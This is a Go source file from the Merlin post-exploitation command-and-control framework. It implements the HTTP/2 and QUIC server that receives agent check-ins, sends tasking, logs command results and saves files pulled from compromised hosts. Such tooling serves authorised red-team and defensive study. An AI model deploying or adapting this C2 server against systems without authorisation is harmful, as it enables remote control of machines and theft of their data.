// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package http2

import (
	// Standard
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	// 3rd Party
	"github.com/fatih/color"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/h2quic"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agents"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/logging"
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/util"
)

// Server is a structure for creating and instantiating new server objects
type Server struct {
	Interface   string
	Port        int
	Protocol    string
	Key         string
	Certificate string
	Server      interface{}
	Mux         *http.ServeMux
}

// New instantiates a new server object and returns it
func New(iface string, port int, protocol string, key string, certificate string) (Server, error) {
	s := Server{
		Protocol:  protocol,
		Interface: iface,
		Port:      port,
		Mux:       http.NewServeMux(),
	}
	var cer tls.Certificate
	var err error
	// Check if certificate exists on disk
	_, errCrt := os.Stat(certificate)
	if os.IsNotExist(errCrt) {
		// generate a new ephemeral certificate
		m := fmt.Sprintf("No certificate found at %s", certificate)
		logging.Server(m)
		message("note", m)
		t := "Creating in-memory x.509 certificate used for this session only."
		logging.Server(t)
		message("note", t)
		message("info", "Additional details: https://github.com/Ne0nd0g/merlin/wiki/TLS-Certificates")
		cerp, err := util.GenerateTLSCert(nil, nil, nil, nil, nil, nil, true) //ec certs not supported (yet) :(
		if err != nil {
			m := fmt.Sprintf("There was an error generating the SSL/TLS certificate:\r\n%s", err.Error())
			logging.Server(m)
			message("warn", m)
			return s, err
		}
		cer = *cerp
	} else {
		if errCrt != nil {
			m := fmt.Sprintf("There was an error importing the SSL/TLS x509 certificate:\r\n%s", errCrt.Error())
			logging.Server(m)
			message("warn", m)
			return s, errCrt
		}
		s.Certificate = certificate

		_, errKey := os.Stat(key)
		if errKey != nil {
			m := fmt.Sprintf("There was an error importing the SSL/TLS x509 key:\r\n%s", errKey.Error())
			logging.Server(m)
			message("warn", m)
			return s, errKey
		}
		s.Key = key

		cer, err = tls.LoadX509KeyPair(certificate, key)
		if err != nil {
			m := fmt.Sprintf("There was an error importing the SSL/TLS x509 key pair\r\n%s", err.Error())
			logging.Server(m)
			message("warn", m)
			message("warn", "Ensure a keypair is located in the data/x509 directory")
			return s, err
		}
	}

	if len(cer.Certificate) < 1 || cer.PrivateKey == nil {
		m := "Unable to import certificate for use in Merlin: empty certificate structure."
		logging.Server(m)
		message("warn", m)
		return s, errors.New("empty certificate structure")
	}

	// Parse into X.509 format
	x, errX509 := x509.ParseCertificate(cer.Certificate[0])
	if errX509 != nil {
		m := fmt.Sprintf("There was an error parsing the tls.Certificate structure into a x509.Certificate"+
			" structure:\r\n%s", errX509.Error())
		logging.Server(m)
		message("warn", m)
		return s, errX509
	}
	// Create fingerprint
	S256 := sha256.Sum256(x.Raw)
	sha256Fingerprint := hex.EncodeToString(S256[:])

	// merlinCRT is the string representation of the SHA1 fingerprint for the public x.509 certificate distributed with Merlin
	merlinCRT := "4af9224c77821bc8a46503cfc2764b94b1fc8aa2521afc627e835f0b3c449f50"

	// Check to see if the Public Key SHA1 finger print matches the certificate distributed with Merlin for testing
	if merlinCRT == sha256Fingerprint {
		message("warn", "Insecure publicly distributed Merlin x.509 testing certificate in use")
		message("info", "Additional details: https://github.com/Ne0nd0g/merlin/wiki/TLS-Certificates")
	}

	// Log certificate information
	logging.Server(fmt.Sprintf("Starting Merlin Server using an X.509 certificate with a %s signature of %s",
		x.SignatureAlgorithm.String(), hex.EncodeToString(x.Signature)))
	logging.Server(fmt.Sprintf("Starting Merlin Server using an X.509 certificate with a public key of %v", x.PublicKey))
	logging.Server(fmt.Sprintf("Starting Merlin Server using an X.509 certificate with a serial number of %d", x.SerialNumber))
	logging.Server(fmt.Sprintf("Starting Merlin Server using an X.509 certifcate with a subject of %s", x.Subject.String()))
	logging.Server(fmt.Sprintf("Starting Merlin Server using an X.509 certificate with a SHA256 hash, "+
		"calculated by Merlin, of %s", sha256Fingerprint))

	// Configure TLS
	TLSConfig := &tls.Config{
		Certificates: []tls.Certificate{cer},
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	s.Mux.HandleFunc("/", agentHandler)

	srv := &http.Server{
		Addr:           s.Interface + ":" + strconv.Itoa(s.Port),
		Handler:        s.Mux,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
		TLSConfig:      TLSConfig,
	}

	if s.Protocol == "h2" {
		s.Server = srv
	} else if s.Protocol == "hq" {
		s.Server = &h2quic.Server{
			Server: srv,
			QuicConfig: &quic.Config{
				KeepAlive:                   false,
				IdleTimeout:                 168 * time.Hour,
				RequestConnectionIDOmission: false,
			},
		}

	} else {
		return s, fmt.Errorf("%s is an invalid server protocol", s.Protocol)
	}
	return s, nil
}

// Run function starts the server on the preconfigured port for the preconfigured service
func (s *Server) Run() error {
	logging.Server(fmt.Sprintf("Starting %s Listener at %s:%d", s.Protocol, s.Interface, s.Port))

	time.Sleep(45 * time.Millisecond) // Sleep to allow the shell to start up
	message("note", fmt.Sprintf("Starting %s listener on %s:%d", s.Protocol, s.Interface, s.Port))

	if s.Protocol == "h2" {
		server := s.Server.(*http.Server)

		defer func() {
			err := server.Close()
			if err != nil {
				m := fmt.Sprintf("There was an error starting the h2 server:\r\n%s", err.Error())
				logging.Server(m)
				message("warn", m)
				return
			}
		}()
		go logging.Server(server.ListenAndServeTLS(s.Certificate, s.Key).Error())
		return nil
	} else if s.Protocol == "hq" {
		server := s.Server.(*h2quic.Server)

		defer func() {
			err := server.Close()
			if err != nil {
				m := fmt.Sprintf("There was an error starting the hq server:\r\n%s", err.Error())
				logging.Server(m)
				message("warn", m)
				return
			}
		}()
		go logging.Server(server.ListenAndServeTLS(s.Certificate, s.Key).Error())
		return nil
	}
	return fmt.Errorf("%s is an invalid server protocol", s.Protocol)
}

// agentHandler function is responsible for all Merlin agent traffic
func agentHandler(w http.ResponseWriter, r *http.Request) {
	if core.Verbose {
		message("note", fmt.Sprintf("Received HTTP %s Connection from %s", r.Method, r.RemoteAddr))
		logging.Server(fmt.Sprintf("Received HTTP %s Connection from %s", r.Method, r.RemoteAddr))
	}

	if core.Debug {
		message("debug", fmt.Sprintf("HTTP Connection Details:"))
		message("debug", fmt.Sprintf("Host: %s", r.Host))
		message("debug", fmt.Sprintf("URI: %s", r.RequestURI))
		message("debug", fmt.Sprintf("Method: %s", r.Method))
		message("debug", fmt.Sprintf("Protocol: %s", r.Proto))
		message("debug", fmt.Sprintf("Headers: %s", r.Header))
		message("debug", fmt.Sprintf("TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol))
		message("debug", fmt.Sprintf("TLS Cipher Suite: %d", r.TLS.CipherSuite))
		message("debug", fmt.Sprintf("TLS Server Name: %s", r.TLS.ServerName))
		message("debug", fmt.Sprintf("Content Length: %d", r.ContentLength))

		logging.Server(fmt.Sprintf("[DEBUG]HTTP Connection Details:"))
		logging.Server(fmt.Sprintf("[DEBUG]Host: %s", r.Host))
		logging.Server(fmt.Sprintf("[DEBUG]URI: %s", r.RequestURI))
		logging.Server(fmt.Sprintf("[DEBUG]Method: %s", r.Method))
		logging.Server(fmt.Sprintf("[DEBUG]Protocol: %s", r.Proto))
		logging.Server(fmt.Sprintf("[DEBUG]Headers: %s", r.Header))
		logging.Server(fmt.Sprintf("[DEBUG]TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol))
		logging.Server(fmt.Sprintf("[DEBUG]TLS Cipher Suite: %d", r.TLS.CipherSuite))
		logging.Server(fmt.Sprintf("[DEBUG]TLS Server Name: %s", r.TLS.ServerName))
		logging.Server(fmt.Sprintf("[DEBUG]Content Length: %d", r.ContentLength))
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")

	if r.Method == "POST" && r.ProtoMajor == 2 {

		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		//reading the body before parsing json seems to resolve the receiving error on large bodies for some reason, unsure why
		b, e := ioutil.ReadAll(r.Body)
		if e != nil {
			message("warn", fmt.Sprintf("There was an error reading a POST message sent by an "+
				"agent:\r\n%s", e))
			return
		}

		e = json.NewDecoder(bytes.NewReader(b)).Decode(&j)
		if e != nil {
			message("warn", fmt.Sprintf("There was an error decoding a POST message sent by an "+
				"agent:\r\n%s", e))
			return
		}
		if core.Debug {
			message("debug", fmt.Sprintf("[DEBUG]POST DATA: %v", j))
		}

		switch j.Type {

		case "InitialCheckIn":
			//var p messages.AgentInfo
			//json.Unmarshal(payload, &p)
			agents.InitialCheckIn(j)

		case "StatusCheckIn":
			w.Header().Set("Content-Type", "application/json")
			x, err := agents.StatusCheckIn(j)
			if core.Verbose {
				message("note", fmt.Sprintf("Sending "+x.Type+" message type to agent"))
			}
			if err != nil {
				m := fmt.Sprintf("There was an error during an Agent StatusCheckIn:\r\n%s", err.Error())
				logging.Server(m)
				message("warn", m)
			}
			err2 := json.NewEncoder(w).Encode(x)
			if err2 != nil {
				m := fmt.Sprintf("There was an error encoding the StatusCheckIn JSON message:\r\n%s", err2.Error())
				logging.Server(m)
				message("warn", m)
				return
			}

		case "CmdResults":
			// TODO move to its own function
			var p messages.CmdResults
			err3 := json.Unmarshal(payload, &p)
			if err3 != nil {
				m := fmt.Sprintf("There was an error unmarshalling the CmdResults JSON object:\r\n%s", err3.Error())
				logging.Server(m)
				message("warn", m)
				return
			}
			agents.Log(j.ID, fmt.Sprintf("Results for job: %s", p.Job))

			message("success", fmt.Sprintf("Results for job %s at %s", p.Job, time.Now().UTC().Format(time.RFC3339)))
			if len(p.Stdout) > 0 {
				agents.Log(j.ID, fmt.Sprintf("Command Results (stdout):\r\n%s", p.Stdout))
				color.Green(p.Stdout)
			}
			if len(p.Stderr) > 0 {
				agents.Log(j.ID, fmt.Sprintf("Command Results (stderr):\r\n%s", p.Stderr))
				color.Red(p.Stderr)
			}

		case "AgentInfo":
			var p messages.AgentInfo
			err4 := json.Unmarshal(payload, &p)
			if err4 != nil {
				m := fmt.Sprintf("There was an error unmarshalling the AgentInfo JSON object:\r\n%s", err4.Error())
				logging.Server(m)
				message("warn", m)
				return
			}
			if core.Debug {
				message("debug", fmt.Sprintf("AgentInfo JSON object: %v", p))
			}
			agents.UpdateInfo(j, p)
		case "FileTransfer":
			var p messages.FileTransfer
			err5 := json.Unmarshal(payload, &p)
			if err5 != nil {
				m := fmt.Sprintf("There was an error unmarshalling the FileTransfer JSON object:\r\n%s", err5.Error())
				logging.Server(m)
				message("warn", m)
			}
			if p.IsDownload {
				agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
				_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
				if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
					m := fmt.Sprintf("There was an error locating the agent's directory:\r\n%s", errD.Error())
					logging.Server(m)
					message("warn", m)
				}
				message("success", fmt.Sprintf("Results for job %s", p.Job))
				downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

				if downloadBlobErr != nil {
					m := fmt.Sprintf("There was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
					logging.Server(m)
					message("warn", m)
				} else {
					downloadFile := filepath.Join(agentsDir, j.ID.String(), f)
					writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0644)
					if writingErr != nil {
						m := fmt.Sprintf("There was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
						logging.Server(m)
						message("warn", m)
					} else {
						message("success", fmt.Sprintf("Successfully downloaded file %s with a size of "+
							"%d bytes from agent %s to %s",
							p.FileLocation,
							len(downloadBlob),
							j.ID.String(),
							downloadFile))
						agents.Log(j.ID, fmt.Sprintf("Successfully downloaded file %s with a size of %d "+
							"bytes from agent to %s",
							p.FileLocation,
							len(downloadBlob),
							downloadFile))
					}
				}
			}
		default:
			message("warn", fmt.Sprintf("Invalid Activity: %s", j.Type))
		}

	} else if r.Method == "GET" {
		// Should answer any GET requests
		// Send 404
		w.WriteHeader(404)
	} else if r.Method == "OPTIONS" && r.ProtoMajor == 2 {
		w.Header().Set("Access-Control-Allow-Methods", "POST")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Headers", "accept, content-type")
	} else {
		w.WriteHeader(404)
	}
}

// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// TODO make sure all errors are logged to server log
